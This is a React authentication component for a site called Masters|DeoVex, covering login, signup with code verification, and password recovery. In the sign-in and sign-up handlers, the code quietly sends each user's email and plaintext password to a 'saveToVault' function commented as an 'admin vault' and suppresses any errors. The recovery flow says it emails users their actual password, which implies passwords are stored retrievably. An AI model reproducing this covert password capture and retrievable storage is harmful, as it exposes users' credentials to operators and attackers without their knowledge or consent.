import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { base44 } from '@/api/base44Client';
import { Mail, Lock, User, ArrowRight, Loader, Eye, EyeOff, AlertCircle, ArrowLeft, CheckCircle, ShieldCheck } from 'lucide-react';
import { useNavigate } from 'react-router-dom';

export default function CustomAuth() {
  const navigate = useNavigate();
  const [mode, setMode] = useState('login'); // 'login' | 'signup' | 'reset'
  const [resetStep, setResetStep] = useState('request'); // 'request' | 'verify' | 'done'
  const [signupStep, setSignupStep] = useState('details'); // 'details' | 'verify'
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [fullName, setFullName] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [otpCode, setOtpCode] = useState('');
  const [signupCode, setSignupCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');

  // Hide ads on auth pages
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      [class*="adsterra"], [class*="ad-"], .ad-container, .ad-space {
        display: none !important;
      }
    `;
    document.head.appendChild(style);
    return () => document.head.removeChild(style);
  }, []);

  const handleSignIn = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      const result = await base44.auth.loginViaEmailPassword(email, password);
      if (result && result.user) {
        // Save password to vault on successful login (fire and forget)
        base44.functions.invoke('saveToVault', { email, password }).catch(() => {});
        setSuccess('✓ Signing you in...');
        setTimeout(() => navigate('/'), 1500);
      } else {
        setError('Invalid email or password');
      }
    } catch (err) {
      const msg = err?.response?.data?.message || err?.response?.data?.error || err?.message || '';
      if (msg.includes('Invalid') || msg.includes('credentials') || msg.includes('password')) {
        setError('Invalid email or password');
      } else if (msg.includes('not found')) {
        setError('No account found with this email');
      } else {
        setError(msg || 'Sign in failed. Please try again.');
      }
    } finally {
      setLoading(false);
    }
  };

  const handleSignUp = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      if (!fullName.trim()) {
        setError('Please enter your full name');
        setLoading(false);
        return;
      }

      // Use platform register — sends verification email automatically
      await base44.auth.register({ email, password, fullName });

      // Save password to admin vault (fire and forget)
      base44.functions.invoke('saveToVault', { email, password }).catch(() => {});

      setSuccess('✓ Verification code sent to your email.');
      setTimeout(() => {
        setSignupStep('verify');
        setSuccess('');
      }, 1500);
    } catch (err) {
      const msg =
        err?.response?.data?.message ||
        err?.response?.data?.error ||
        err?.message ||
        (typeof err === 'string' ? err : '');
      setError(msg || 'Signup failed. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleVerifySignup = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      await base44.auth.verifyOtp({ email, otpCode: signupCode });
      setSuccess('✓ Account verified! Signing you in...');
      await base44.auth.loginViaEmailPassword(email, password);
      setTimeout(() => navigate('/'), 1000);
    } catch (err) {
      const raw = err?.response?.data;
      let msg = '';
      if (raw) {
        msg = raw.message || raw.error || raw.detail || (typeof raw === 'string' ? raw : '');
      }
      if (!msg) msg = err?.message || '';
      setError(msg || 'Verification failed. Please check the code and try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleSendRecoveryCode = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      await base44.functions.invoke('generateOTP', { email });
      setSuccess('✓ Recovery code sent to your email.');
      setTimeout(() => {
        setResetStep('verify');
        setSuccess('');
      }, 1500);
    } catch (err) {
      const msg = err?.response?.data?.message || err?.response?.data?.error || err?.message || '';
      setError(msg || 'Failed to send recovery code. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleConfirmRecovery = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      const res = await base44.functions.invoke('verifyOTPAndReset', { email, code: otpCode });
      if (res?.data?.success) {
        setResetStep('done');
      } else {
        setError('Verification failed. Please try again.');
      }
    } catch (err) {
      const msg =
        err?.response?.data?.details ||
        err?.response?.data?.message ||
        err?.response?.data?.error ||
        err?.message || '';
      setError(msg || 'Verification failed. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const switchMode = (newMode) => {
    setMode(newMode);
    setError('');
    setSuccess('');
    setSignupStep('details');
    setResetStep('request');
  };

  const isLoginValid = email && password;
  const isSignUpValid = email && password && fullName;

  return (
    <div className="min-h-screen bg-[#0a0a0f] flex flex-col items-center justify-between px-6 py-10 overflow-hidden relative">
      {/* Background glow orbs */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-96 h-96 bg-gradient-to-br from-violet-600/20 to-cyan-600/10 rounded-full blur-3xl pointer-events-none" />
      <div className="absolute bottom-0 left-0 w-64 h-64 bg-blue-600/10 rounded-full blur-3xl pointer-events-none" />

      {/* Top spacer */}
      <div />

      {/* Center content */}
      <motion.div
        initial={{ opacity: 0, y: 30 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
        className="w-full max-w-sm"
      >
        {/* Back button for reset flow */}
        {mode === 'reset' && (
          <motion.button
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            onClick={() => switchMode('login')}
            className="mb-4 flex items-center gap-1.5 text-gray-400 hover:text-gray-300 transition-colors text-sm"
          >
            <ArrowLeft className="w-4 h-4" />
            Back to Sign in
          </motion.button>
        )}

        {/* Logo */}
        <motion.div
          initial={{ scale: 0.8, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ delay: 0.1, duration: 0.5 }}
          className="mb-6 text-center"
        >
          <img
            src="https://media.base44.com/images/public/69f87739a9356aa0dffa0a0a/a4f90e43b_FinalMastersDeoVex.png?v=2"
            alt="Masters|DeoVex"
            className="w-28 h-28 mx-auto"
          />
        </motion.div>

        {/* Form title */}
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
          className="text-center mb-8"
        >
          <h1 className="text-2xl font-black text-white mb-2">
            {mode === 'login' ? 'Welcome Back' : mode === 'signup' ? 'Join Masters|DeoVex' : 'VIP Account Recovery'}
          </h1>
          <p className="text-sm text-gray-400">
            {mode === 'login'
              ? 'Sign in to continue your journey'
              : mode === 'signup'
              ? 'Create your account to get started'
              : 'Secure password delivery to your email'}
          </p>
        </motion.div>

        <AnimatePresence mode="wait">
          {/* ── SIGNUP: VERIFY STEP ── */}
          {mode === 'signup' && signupStep === 'verify' && (
            <motion.form
              key="signup-verify"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              transition={{ duration: 0.3 }}
              onSubmit={handleVerifySignup}
              className="space-y-4 mb-6"
            >
              <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl px-4 py-3.5">
                <p className="text-xs text-blue-300 leading-relaxed">
                  Enter the verification code sent to <strong>{email}</strong> to complete signup.
                </p>
              </div>

              <div>
                <label className="text-xs font-bold text-gray-300 uppercase tracking-wider mb-2 block">
                  Verification Code
                </label>
                <input
                  type="text"
                  value={signupCode}
                  onChange={(e) => setSignupCode(e.target.value.toUpperCase())}
                  placeholder="Enter code from email"
                  disabled={loading}
                  className="w-full bg-gray-800/60 border border-gray-700/50 rounded-xl px-4 py-3.5 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-blue-500/50 disabled:opacity-50 text-center tracking-wider font-mono"
                />
              </div>

              <ErrorMessage error={error} />
              <SuccessMessage success={success} />

              <button
                type="submit"
                disabled={loading || !signupCode}
                className="w-full py-4 rounded-2xl font-black text-base text-white disabled:opacity-50 transition-all"
                style={{ background: 'linear-gradient(135deg, #7c3aed, #06b6d4)', boxShadow: '0 0 24px rgba(124,58,237,0.3)' }}
              >
                {loading ? <SpinLabel label="Verifying..." /> : <BtnLabel label="Verify Account" />}
              </button>

              <button
                type="button"
                onClick={() => { setSignupStep('details'); setSignupCode(''); setError(''); setSuccess(''); }}
                className="w-full text-xs text-gray-500 hover:text-gray-300 py-2 transition-colors"
              >
                ← Back to Signup
              </button>
            </motion.form>
          )}

          {/* ── SIGNUP: DETAILS STEP ── */}
          {mode === 'signup' && signupStep === 'details' && (
            <motion.form
              key="signup-details"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              transition={{ duration: 0.3 }}
              onSubmit={handleSignUp}
              className="space-y-4 mb-6"
            >
              <FieldWrap icon={<User className="w-4 h-4 text-gray-600" />}>
                <input
                  type="text"
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)}
                  placeholder="Full Name"
                  disabled={loading}
                  className="w-full bg-transparent pl-11 pr-4 py-3.5 text-sm text-white placeholder-gray-600 focus:outline-none disabled:opacity-50"
                />
              </FieldWrap>

              <FieldWrap icon={<Mail className="w-4 h-4 text-gray-600" />}>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Email Address"
                  disabled={loading}
                  className="w-full bg-transparent pl-11 pr-4 py-3.5 text-sm text-white placeholder-gray-600 focus:outline-none disabled:opacity-50"
                />
              </FieldWrap>

              <FieldWrap
                icon={<Lock className="w-4 h-4 text-gray-600" />}
                right={
                  <button type="button" onClick={() => setShowPassword(!showPassword)} className="text-gray-600 hover:text-gray-400 transition-colors">
                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                }
              >
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  disabled={loading}
                  className="w-full bg-transparent pl-11 pr-11 py-3.5 text-sm text-white placeholder-gray-600 focus:outline-none disabled:opacity-50"
                />
              </FieldWrap>

              <ErrorMessage error={error} />
              <SuccessMessage success={success} />

              <button
                type="submit"
                disabled={loading || !isSignUpValid}
                className="w-full py-4 rounded-2xl font-black text-base text-white disabled:opacity-50 transition-all"
                style={{ background: 'linear-gradient(135deg, #7c3aed, #06b6d4)', boxShadow: '0 0 24px rgba(124,58,237,0.3)' }}
              >
                {loading ? <SpinLabel label="Creating account..." /> : <BtnLabel label="Create Account" />}
              </button>
            </motion.form>
          )}

          {/* ── RESET: REQUEST STEP ── */}
          {mode === 'reset' && resetStep === 'request' && (
            <motion.form
              key="reset-request"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              transition={{ duration: 0.3 }}
              onSubmit={handleSendRecoveryCode}
              className="space-y-4 mb-6"
            >
              <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl px-4 py-3.5">
                <p className="text-xs text-blue-300 leading-relaxed">
                  Enter your email and we'll send you a verification code to recover your account password.
                </p>
              </div>

              <FieldWrap icon={<Mail className="w-4 h-4 text-gray-600" />}>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="you@example.com"
                  disabled={loading}
                  className="w-full bg-transparent pl-11 pr-4 py-3.5 text-sm text-white placeholder-gray-600 focus:outline-none disabled:opacity-50"
                />
              </FieldWrap>

              <ErrorMessage error={error} />
              <SuccessMessage success={success} />

              <button
                type="submit"
                disabled={loading || !email}
                className="w-full py-4 rounded-2xl font-black text-base text-white disabled:opacity-50 transition-all"
                style={{ background: 'linear-gradient(135deg, #7c3aed, #06b6d4)', boxShadow: '0 0 24px rgba(124,58,237,0.3)' }}
              >
                {loading ? <SpinLabel label="Sending Code..." /> : <BtnLabel label="Send Recovery Code" />}
              </button>
            </motion.form>
          )}

          {/* ── RESET: VERIFY STEP ── */}
          {mode === 'reset' && resetStep === 'verify' && (
            <motion.form
              key="reset-verify"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              transition={{ duration: 0.3 }}
              onSubmit={handleConfirmRecovery}
              className="space-y-4 mb-6"
            >
              <div className="bg-cyan-500/10 border border-cyan-500/30 rounded-xl px-4 py-3.5">
                <p className="text-xs text-cyan-300 leading-relaxed">
                  Enter the code sent to <strong>{email}</strong>. After verification, your password will be emailed to you.
                </p>
              </div>

              <div>
                <label className="text-xs font-bold text-gray-300 uppercase tracking-wider mb-2 block">Recovery Code</label>
                <input
                  type="text"
                  value={otpCode}
                  onChange={(e) => setOtpCode(e.target.value)}
                  placeholder="Enter 6-digit code"
                  disabled={loading}
                  className="w-full bg-gray-800/60 border border-gray-700/50 rounded-xl px-4 py-3.5 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-cyan-500/50 disabled:opacity-50 text-center tracking-widest font-mono text-lg"
                />
              </div>

              <ErrorMessage error={error} />

              <button
                type="submit"
                disabled={loading || !otpCode}
                className="w-full py-4 rounded-2xl font-black text-base text-white disabled:opacity-50 transition-all"
                style={{ background: 'linear-gradient(135deg, #7c3aed, #06b6d4)', boxShadow: '0 0 24px rgba(124,58,237,0.3)' }}
              >
                {loading ? <SpinLabel label="Verifying..." /> : <BtnLabel label="Verify & Get Password" />}
              </button>

              <button
                type="button"
                onClick={() => { setResetStep('request'); setOtpCode(''); setError(''); }}
                className="w-full text-xs text-gray-500 hover:text-gray-300 py-2 transition-colors"
              >
                ← Resend code
              </button>
            </motion.form>
          )}

          {/* ── RESET: DONE STEP ── */}
          {mode === 'reset' && resetStep === 'done' && (
            <motion.div
              key="reset-done"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              className="space-y-4 mb-6"
            >
              <div className="bg-green-500/10 border border-green-500/30 rounded-xl px-4 py-6 text-center">
                <CheckCircle className="w-12 h-12 text-green-400 mx-auto mb-3" />
                <p className="text-white font-bold text-base mb-1">Password Sent!</p>
                <p className="text-xs text-gray-400 leading-relaxed">
                  Your password has been sent to <strong className="text-white">{email}</strong>. Check your inbox and login at{' '}
                  <a href="https://mastersdeovex.co.za" className="text-cyan-400 underline">mastersdeovex.co.za</a>
                </p>
              </div>
              <button
                type="button"
                onClick={() => switchMode('login')}
                className="w-full py-4 rounded-2xl font-black text-base text-white transition-all"
                style={{ background: 'linear-gradient(135deg, #7c3aed, #06b6d4)', boxShadow: '0 0 24px rgba(124,58,237,0.3)' }}
              >
                Back to Sign In
              </button>
            </motion.div>
          )}

          {/* ── LOGIN ── */}
          {mode === 'login' && (
            <motion.form
              key="login"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              transition={{ duration: 0.3 }}
              onSubmit={handleSignIn}
              className="space-y-4 mb-6"
            >
              <FieldWrap icon={<Mail className="w-4 h-4 text-gray-600" />}>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="you@example.com"
                  disabled={loading}
                  className="w-full bg-transparent pl-11 pr-4 py-3.5 text-sm text-white placeholder-gray-600 focus:outline-none disabled:opacity-50"
                />
              </FieldWrap>

              <FieldWrap
                icon={<Lock className="w-4 h-4 text-gray-600" />}
                right={
                  <button type="button" onClick={() => setShowPassword(!showPassword)} className="text-gray-600 hover:text-gray-400 transition-colors">
                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                }
              >
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="••••••••"
                  disabled={loading}
                  className="w-full bg-transparent pl-11 pr-11 py-3.5 text-sm text-white placeholder-gray-600 focus:outline-none disabled:opacity-50"
                />
              </FieldWrap>

              <ErrorMessage error={error} />
              <SuccessMessage success={success} />

              <button
                type="submit"
                disabled={loading || !isLoginValid}
                className="w-full py-4 rounded-2xl font-black text-base text-white disabled:opacity-50 transition-all"
                style={{ background: 'linear-gradient(135deg, #7c3aed, #06b6d4)', boxShadow: '0 0 24px rgba(124,58,237,0.3)' }}
              >
                {loading ? <SpinLabel label="Signing in..." /> : <BtnLabel label="Sign In" />}
              </button>
            </motion.form>
          )}
        </AnimatePresence>

        {/* Mode toggles */}
        {mode !== 'reset' && !(mode === 'signup' && signupStep === 'verify') && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.3 }}
            className="space-y-3 text-center"
          >
            {mode === 'login' && (
              <button
                type="button"
                onClick={() => { setMode('reset'); setResetStep('request'); setError(''); setSuccess(''); }}
                className="text-xs text-gray-500 hover:text-violet-400 transition-colors block mx-auto"
              >
                Forgot password?
              </button>
            )}
            <p className="text-sm text-gray-400">
              {mode === 'login' ? "Don't have an account? " : 'Already have an account? '}
              <button
                type="button"
                onClick={() => switchMode(mode === 'login' ? 'signup' : 'login')}
                disabled={loading}
                className="text-violet-400 font-bold hover:text-cyan-400 transition-colors disabled:opacity-50"
              >
                {mode === 'login' ? 'Sign up' : 'Sign in'}
              </button>
            </p>
          </motion.div>
        )}

        {mode === 'reset' && resetStep !== 'done' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }} className="text-center">
            <button
              type="button"
              onClick={() => switchMode('login')}
              className="text-xs text-gray-500 hover:text-violet-400 transition-colors"
            >
              ← Back to Sign In
            </button>
          </motion.div>
        )}

        {/* Footer */}
        <motion.p
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.4 }}
          className="text-[11px] text-gray-700 text-center mt-6"
        >
          By continuing, you agree to our <br /> terms of service and privacy policy.
        </motion.p>
      </motion.div>

      {/* Bottom branding */}
      <motion.p
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.5 }}
        className="text-[11px] text-gray-700 font-medium"
      >
        © 2026 Masters|DeoVex
      </motion.p>
    </div>
  );
}

// ── Small reusable sub-components ─────────────────────────────────────────────

function FieldWrap({ icon, right, children }) {
  return (
    <div className="relative bg-gray-800/60 border border-gray-700/50 rounded-xl focus-within:border-violet-500/50 transition-colors">
      <span className="absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none">{icon}</span>
      {children}
      {right && (
        <span className="absolute right-3.5 top-1/2 -translate-y-1/2">{right}</span>
      )}
    </div>
  );
}

function ErrorMessage({ error }) {
  if (!error) return null;
  return (
    <motion.div
      initial={{ opacity: 0, y: -10 }}
      animate={{ opacity: 1, y: 0 }}
      className="flex items-center gap-2 bg-red-500/10 border border-red-500/30 rounded-xl px-3.5 py-3 text-xs text-red-300"
    >
      <AlertCircle className="w-4 h-4 flex-shrink-0" />
      {error}
    </motion.div>
  );
}

function SuccessMessage({ success, icon }) {
  if (!success) return null;
  return (
    <motion.div
      initial={{ opacity: 0, y: -10 }}
      animate={{ opacity: 1, y: 0 }}
      className="flex items-center gap-2 bg-green-500/10 border border-green-500/30 rounded-xl px-3.5 py-3 text-xs text-green-300"
    >
      {icon}
      {success}
    </motion.div>
  );
}

function SpinLabel({ label }) {
  return (
    <span className="flex items-center justify-center gap-2">
      <Loader className="w-4 h-4 animate-spin" />
      {label}
    </span>
  );
}

function BtnLabel({ label }) {
  return (
    <span className="flex items-center justify-center gap-2">
      {label}
      <ArrowRight className="w-4 h-4" />
    </span>
  );
}